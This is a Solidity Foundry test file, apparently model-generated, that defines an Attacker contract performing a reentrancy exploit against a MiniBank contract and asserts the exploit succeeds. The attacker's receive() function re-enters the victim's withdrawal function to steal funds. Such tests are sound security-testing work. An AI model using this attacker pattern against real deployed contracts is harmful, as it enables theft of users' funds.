// Generation Time: 8,52s
// Input Tokens: 3594
// Output Tokens: 658
// Reasoning Tokens: 0


// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {MiniBank} from "../src/MiniBank.sol";

contract TestReentrancyMiniBank is Test {
    MiniBank public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new MiniBank();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0.01 ether && attackVal < type(uint128).max);

        // Fund the Victim (so it has ETH to steal)
        vm.deal(address(_contractUnderTest), attackVal * 2);
        
        // Fund the Attacker
        vm.deal(address(_attacker), attackVal * 2);

        // Fund the Test Contract
        vm.deal(address(this), attackVal * 2);

        // Trigger the attack sequence
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    MiniBank public _victim;
    
    uint256 public reentrancyCount;
    bool public exploitSucceeded;

    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        _victim = MiniBank(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        reentrancyCount = 0;
        exploitSucceeded = false;
        
        // Deposit into the victim contract to establish a balance
        _victim.receiveCurrency{value: val}();
    }

    function attack(uint256 val) public {
        storedAttackVal = val;

        // Call the vulnerable function to initiate the attack
        _victim.sendCurrency();

        // Set exploitSucceeded based on the success condition
        if (reentrancyCount > 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        reentrancyCount++;
        if (reentrancyCount < 2) {
            // Re-enter the victim's vulnerable method
            _victim.sendCurrency();
        }
    }
}
